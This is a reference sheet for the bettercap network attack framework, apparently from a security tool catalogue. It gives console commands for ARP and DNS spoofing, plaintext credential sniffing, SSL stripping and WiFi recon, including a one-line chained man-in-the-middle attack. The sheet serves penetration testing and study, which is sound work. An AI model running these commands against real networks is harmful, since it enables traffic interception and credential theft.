# bettercap

- **Category**: Sniffing & Spoofing / Network Attack Framework
- **Risk Level**: 🔴 High

---

## Description

A powerful, easily extensible and portable framework written in Go which aims to offer security researchers, red teamers and reverse engineers an easy to use, all-in-one solution for performing reconnaissance and attacking WiFi networks, Bluetooth Low Energy devices, CAN-bus, wireless HID devices and IPv4/IPv6 Ethernet networks. Supports ARP/DNS/NDP/DHCPv6 spoofing for MITM attacks, packet/TCP/HTTP(S) proxies, network sniffing, credential harvesting, port scanning, and a REST API with Web UI.

## Installation

```bash
sudo apt install bettercap
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `-iface <iface>` | Network interface to listen on (auto-detected if not specified) |
| `-caplet FILE` | Load preset script (caplet file) |
| `-eval CMD` | Execute specified command on startup |
| `-env-file FILE` | Load environment variables from file on startup |
| `-autostart MODULES` | Comma-separated list of modules to auto-start (default: `events.stream`) |
| `-caplets-path PATH` | Alternative base path for caplet files |
| `-no-colors` | No colored output |
| `-no-history` | Disable interactive session history file |
| `-silent` | Silent mode, reduce output |
| `-debug` | Debug mode |

## Common Commands

### Startup & Basic Operations

```bash
# Start (requires root)
sudo bettercap -iface eth0

# Start and load a caplet script
sudo bettercap -iface eth0 -caplet /path/to/script.cap

# Web UI mode (control via browser)
sudo bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/http-ui.cap
# Access http://127.0.0.1 (port 80) — default credentials: user / pass
# ⚠️ http-ui.cap sets api.rest.port = 8081 (API) and http.server.port = 80 (UI); verify with:
#    grep -i port /usr/share/bettercap/caplets/http-ui.cap
```

### Interactive Console Common Commands

```bash
# Network reconnaissance
net.probe on          # Actively probe LAN hosts
net.show              # Show discovered hosts list

# ARP spoofing (man-in-the-middle)
set arp.spoof.targets 192.168.1.100   # Set target
arp.spoof on          # Start ARP spoofing

# HTTP traffic sniffing (capture plaintext passwords)
net.sniff on
set net.sniff.verbose true

# HTTP proxy (intercept and modify HTTP traffic)
http.proxy on

# HTTPS downgrade (SSL stripping)
# ⚠️ SSL stripping does NOT work against sites with HSTS or HSTS preloading
# SSL stripping (HTTPS→HTTP downgrade) is done via http.proxy, not https.proxy
# https.proxy with sslstrip only strips HSTS headers from TLS-intercepted traffic
set http.proxy.sslstrip true
http.proxy on

# DNS spoofing (resolve domain names to specified IP)
set dns.spoof.domains target.com,*.target.com
set dns.spoof.address 192.168.1.10   # Attacker IP
dns.spoof on

# WiFi scanning
wifi.recon on
wifi.show

# Stop all modules
net.sniff off; arp.spoof off; dns.spoof off
```

### Caplets (Preset Scripts)

```bash
# List built-in caplets
ls /usr/share/bettercap/caplets/

# Combined ARP + sniffing attack
sudo bettercap -iface eth0 -eval "net.probe on; arp.spoof on; net.sniff on"
```

## Notes & Tips
1. Requires being on the same LAN as the target — bettercap cannot attack hosts across routed network boundaries without additional configuration.
2. SSL stripping (sslstrip) does not work on sites with HSTS or HSTS preloading enabled — modern browsers are largely protected.
3. Heavy or repeated ARP traffic is easily detected by network administrators and IDS/IPS — use sparingly and clean up after testing.
4. Always disable ARP spoofing after testing (`arp.spoof off`); otherwise the target's normal internet access will be disrupted until the ARP cache expires.
5. Use the Web UI (`http-ui.cap`) for interactive lab sessions; use `-eval` flags for scriptable/automated attack chains.

---

## Official References

- [Bettercap Official Site](https://www.bettercap.org/)
- [Bettercap (GitHub)](https://github.com/bettercap/bettercap)
